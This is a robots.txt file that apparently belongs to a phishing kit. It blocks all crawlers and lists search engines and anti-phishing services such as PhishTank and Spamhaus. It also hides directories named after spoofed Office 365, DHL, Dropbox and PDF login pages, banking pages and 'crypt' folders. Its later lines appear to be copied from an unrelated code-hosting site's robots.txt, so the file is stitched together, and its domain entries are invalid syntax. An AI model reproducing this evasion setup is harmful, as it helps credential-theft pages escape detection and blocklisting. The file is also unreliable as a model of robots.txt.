User-Agent: *
Disallow: /
Disallow: yahoo.com
Disallow: google.com
Disallow: phishtank.com
Disallow: bing.com
Disallow: spamhaus.org
Disallow: /clients/
Disallow: /log/
Disallow: /banking/
Disallow: /billing/
Disallow: /bin/
Disallow: /css/
Disallow: /img/
Disallow: /index/
Disallow: /js/
Disallow: /scam/
Disallow: /spam/
Disallow: /fake/
Disallow: /update/
Disallow: /account/
Disallow: /home/
Disallow: /hoax/
Disallow: /Internet Banking/
Disallow: /login/
Disallow: /images/
Disallow: /languages/
Disallow: /fraud/
Disallow: /bank/
Disallow: /security/
Disallow: /wp-includes/
Disallow: /wp-admin/
Disallow: /wp-content/
Disallow: /public_html/
Disallow: /2office365/
Disallow: /ver.pdf.php/
Disallow: /edited365/
Disallow: /editedBestPdf/
Disallow: /editedDB0XTr4p/
Disallow: /editedDhl/
Disallow: /englishedited/
Disallow: /englishedited-auto/
Disallow: /2office365/
Disallow: /Dr0pB0x/home.php
Disallow: /Dr0pB0x/public.php
Disallow: /Dr0pB0x/ver.pdf.php
Disallow: /edited365/aa/index.php
Disallow: /edited365/aa/index2.php
Disallow: /editedBestPdf/index.php
Disallow: /editedBestPdf/l0gin.php
Disallow: /editedDB0XTr4p/index.php
Disallow: /editedDB0XTr4p/home.php
Disallow: /editedDhl/index.php
Disallow: /editedDhl/home.php
Disallow: /englishedited/english/crypt/
Disallow: /englishedited-auto/english/crypt/
Disallow: /collections/
Disallow: /admin/
Allow: /*/*/tree/master
Allow: /*/*/blob/master
Disallow: /ekansa/Open-Context-Data
Disallow: /ekansa/opencontext-*
Disallow: /*/*/pulse
Disallow: /*/*/tree/*
Disallow: /*/*/blob/*
Disallow: /*/*/wiki/*/*
Disallow: /gist/*/*/*
Disallow: /oembed
Disallow: /*/forks
Disallow: /*/stars
Disallow: /*/download
Disallow: /*/revisions
Disallow: /*/*/issues/new
Disallow: /*/*/issues/search
Disallow: /*/*/commits/*/*
Disallow: /*/*/commits/*?author
Disallow: /*/*/commits/*?path
Disallow: /*/*/branches
Disallow: /*/*/tags
Disallow: /*/*/contributors
Disallow: /*/*/comments
